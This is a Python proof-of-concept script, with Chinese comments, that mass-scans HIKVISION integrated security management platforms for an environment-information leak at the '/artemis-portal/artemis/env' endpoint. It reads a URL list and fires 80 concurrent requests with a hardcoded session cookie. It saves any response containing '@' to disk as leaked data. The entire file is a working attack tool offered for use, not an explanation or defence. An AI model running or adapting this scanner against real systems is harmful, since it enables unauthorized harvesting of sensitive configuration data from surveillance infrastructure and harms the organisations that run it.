import requests,argparse,time,sys,os,requests,hashlib
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings() # 解除警告
GREEN = '\033[92m'
RESET = '\033[0m'

def banner():
    text='''

 __    __  __    __  __    __  __       
|  \  |  \|  \  |  \|  \  |  \|  \      
| $$  | $$| $$  | $$| $$  | $$| $$      
 \$$\/  $$ \$$\/  $$ \$$\/  $$| $$      
  >$$  $$   >$$  $$   >$$  $$ | $$      
 /  $$$$\  /  $$$$\  /  $$$$\ | $$      
|  $$ \$$\|  $$ \$$\|  $$ \$$\| $$_____ 
| $$  | $$| $$  | $$| $$  | $$| $$     \瓦吉姆专属，盗者杀无赦
 \$$   \$$ \$$   \$$ \$$   \$$ \$$$$$$$$
                                                    
'''
    print(text)
def main():#通用模板，对单个语法定位，
    parser=argparse.ArgumentParser(description="HiKVISION综合安防管理平台env信息泄漏")
    parser.add_argument('-u','--url',dest='url',type=str,help="input your url")
    parser.add_argument('-f','--file',dest='file',type=str,help="input file path")
    args =parser.parse_args()
    #如果args.url不等于args.file,就输出args.url
    if args.url and not args.file:#确定输出的是单个url
        poc(args.url)
    elif args.file and not args.url:
        url_list =[]
        with open(args.file,'r',encoding='utf-8') as fp:
            for i in fp.readlines():
                url_list.append(i.strip().replace('\n',''))
        mp =Pool(80)
        mp.map(poc,url_list)
        mp.close()
        mp.join()        
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")

def poc(target):  
    url = target + '/artemis-portal/artemis/env'  
    headers = {  
        'Pragma': 'no-cache',
        'Cache-Control': 'no-cache',
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 Edg/123.0.0.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Accept-Encoding': 'gzip, deflate, br',
        'Accept-Language': 'zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6',
        'Cookie': 'portal_sess_http=PGyAy4Yny1rqdlGU7jKwnGCnIM3_ctk_tpr8GEKpSqfj9IQy7VypDhlVAS0_D5xW; portal_locale_cookie=zh_CN; portal_locale_cookie.sig=VGxNpP7F4XZ1Gp3jFG_eDaYRyjAPOrprGsuvEUOU4_s; portal_locale_cookie_egg=zh_CN; portal_locale_cookie_egg.sig=w1ywwaZdZHDklrBdqaDLkbkaT6pDsqBnY3Yx5WYGaDo; portal_type_cookie=iportal; portal_type_cookie.sig=UCZaF8EkRMH4dmm8_FyX0-kK5EmKE5pVSkOszTqKyzs',
        'Connection': 'close',


    }  
      
    # 创建一个文件夹来存储响应体文件（如果尚未存在）  
    response_dir = 'response_bodies'  
    if not os.path.exists(response_dir):  
        os.makedirs(response_dir)
      
    try:  
        response = requests.get(url=url, headers=headers, timeout=10, verify=False)  
        response_text = response.text  
          
        # 检查响应是否包含特定字符（这里以'@'为例）  
        if '@' in response_text:  
            print(f'[+]该网站存在信息泄露，url为{target}')  
              
            # 构造文件名，这里简单使用URL的哈希值作为文件名以避免冲突  
            filename_hash = hashlib.sha256(url.encode('utf-8')).hexdigest()[:10]  # 取哈希值的前10个字符  
            filename = os.path.join(response_dir, filename_hash + '.txt') 
            with open(filename, 'w', encoding='utf-8') as f:  
                f.write(response_text)
          
        else:  
            print(f'[-]不存在信息泄露，url为{target}')  
      
    except requests.exceptions.RequestException as e:  
        print(f'[*]{target} 请求发生错误: {e}')  

if __name__ == '__main__':
    main()
